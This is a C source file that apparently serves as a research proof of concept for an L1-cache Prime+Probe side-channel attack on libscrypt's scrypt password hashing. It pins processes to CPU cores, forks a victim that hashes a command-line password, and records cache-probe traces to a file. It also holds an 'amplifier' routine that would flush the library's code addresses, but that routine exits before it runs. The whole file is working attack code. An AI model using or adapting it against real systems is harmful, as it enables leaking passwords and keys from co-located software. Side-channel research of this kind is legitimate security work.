#define _GNU_SOURCE

#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <sched.h>
#include <time.h>
#include <util.h>
#include <fcntl.h>
#include <l1.h>
#include <low.h>
#include <sched.h>
#include <semaphore.h>
#include <stdlib.h>
#include <symbol.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include "rdtsc.h"
#include "libscrypt.h"
#include "mysem.h"

#define SHMSZ 10

void print_res(FILE* fp, uint16_t* res, int* rmap, int nsets){
	int i = 0;
	int j = 0;
	for (i = 0; i < 1; i++)
	{
		for (j = 0; j < L1_SETS; j++)
		{
			if (rmap[j] == -1)
				fprintf(fp, "  0 ");
			else
				fprintf(fp, "%3d ", res[i*nsets + rmap[j]]);
		}
		fprintf(fp, "\n");
	}
}

void print_hex(const char *s)
{
  while(*s)
    printf("%02x", (unsigned int) *s++);
  printf("\n");
}

char* libraryStarting(int fd){
    size_t size = lseek(fd, 0, SEEK_END);
    if(size == 0)
        exit(-1);
    size_t map_size = size;
    if ((map_size & 0xFFF) != 0){
      map_size |= 0xFFF;
      map_size += 1;
    }
    return (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
}

int main(int argv, char *argc[]){
    char buff[64];

    int i,j;
    int fd = open("./libscrypt.so", O_RDONLY);
    if(fd == -1){
        perror("Can't open the file, please check\n");
        return 1;
    }
    char* base = libraryStarting(fd);

    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(2, &mask);

    if(sched_setaffinity(0, sizeof(mask), &mask) != 0)
        perror("some error occurred while setting the affinity.\n");

    //shared memory
    key_t key;
    key = 4567;
    int shmid;
    volatile char *sync;

    if ((shmid = shmget(key, SHMSZ, IPC_CREAT | 0666)) < 0) {
        perror("shmget");
        exit(1);
    }

    sync = shmat(shmid, NULL, 0);
    if(sync == (char*)-1){
        perror("error with shared memory.\n");
        return 1;
    }

    *sync = 0;

    pid_t attacker = getpid();
    printf("attacker id: %d\n", attacker);
    int childid = fork();
    if(childid == 0){ //victim

        cpu_set_t mask;
        CPU_ZERO(&mask);
        CPU_SET(6, &mask);

        if(sched_setaffinity(0, sizeof(mask), &mask) != 0)
            perror("some error occurred while setting the affinity.\n");
        uint64_t a = rdtsc();
        libscrypt_scrypt((uint8_t*)argc[1], 16, (uint8_t*)"NaCl", 4, 1024, 8, 1, (uint8_t*)buff, 64);
        printf("%llu\n", rdtsc()-a);
        exit(0);
        /* print_hex(buff); */

    } else {
        printf("victim id: %d\n", childid);
        int cid =fork();
        if(cid == 0){ //amplifier
            exit(0);

            cpu_set_t mask;
            CPU_ZERO(&mask);
            CPU_SET(3, &mask);

            if(sched_setaffinity(0, sizeof(mask), &mask) != 0)
                perror("some error occurred while setting the affinity.\n");

            char *monitor[] = {"crypto_scrypt-nosse.c:167","crypto_scrypt-nosse.c:347",
                "crypto_scrypt-nosse.c:378", "crypto_scrypt-nosse.c:88", "crypto_scrypt-nosse.c:101"};
            /* int nmonitor = sizeof(monitor)/sizeof(monitor[0]); */
            uint64_t addresses[] = {0x1132, 0x165c, 0x16b6, 0xfa2, 0x1304};
            for(i=0; i<5; i++){
                /* uint64_t offset = sym_getsymboloffset("~/Desktop/scrypt_test_new/libscrypt/libscrypt.so", monitor[i]); */
                uint64_t offset = addresses[i] + base;
                addresses[i] = offset;
            }

            int j = 0;
            uint64_t a = rdtsc();
            while(j++ < 1600000){
                for(i=0; i<5; i++)
                    clflush(addresses[i]);
            }
            printf("attacker: %llu\n", rdtsc() - a);
            exit(0);
        } else { //prime + probe
            printf("amplifier id: %d\n", cid);

            for(i=0; i<10000; i++); //to make sure that other threads have been launched
            int k=0,no_of_rounds=300;


            struct l1pp{
                void *memory;
                void *fwdlist;
                void *bkwlist;
                uint8_t monitored[L1_SETS];
                int nsets;
            };

            l1pp_t l1 = l1_prepare();
            int nsets = l1_getmonitoredset(l1, NULL, 0);
            int *map = calloc(nsets, sizeof(int));
            l1_getmonitoredset(l1, map, nsets);

            int rmap[L1_SETS];
            for (i = 0; i < L1_SETS; i++)
                rmap[i] = -1;
            for (i = 0; i < nsets; i++)
                rmap[map[i]] = i;

            /* uint16_t *res = calloc(1*64, sizeof(uint16_t)); */
            uint16_t res[no_of_rounds][64];
            for(i=0; i<no_of_rounds; i++)
                for(j=0; j<64; j++)
                    res[i][j] = 0;
            /* for (i = 0; i < 1 * 64; i+= 4096/sizeof(uint16_t)) */
            /*     res[i] = 0; */

            FILE *fp = fopen("cache_traces.txt","w");
            delayloop(3000000000U);

            for(i=0; i<no_of_rounds; i++)
                l1_bprobe(l1, res[i]);


            k = 0;
            wait_master(sync);
                l1_probe(l1, res[k]);
            notify_master(sync);
            while(k<no_of_rounds){
                /* wait_master(sync); */
                /*     l1_probe(l1, res[k]); */
                /* notify_master(sync); */

                    /* printf("client: %d\n",k); */
                wait_master(sync);
                if(k%2==0)
                    l1_bprobe(l1, res[k]);
                else
                    l1_probe(l1, res[k]);

                notify_master(sync);
                k++;
            }
            for(i=0; i<no_of_rounds; i++)
                print_res(fp, res[i], rmap, nsets);

            fclose(fp);
        }

        wait(NULL);
        wait(NULL);
        exit(0);
    }
    return 0;
}

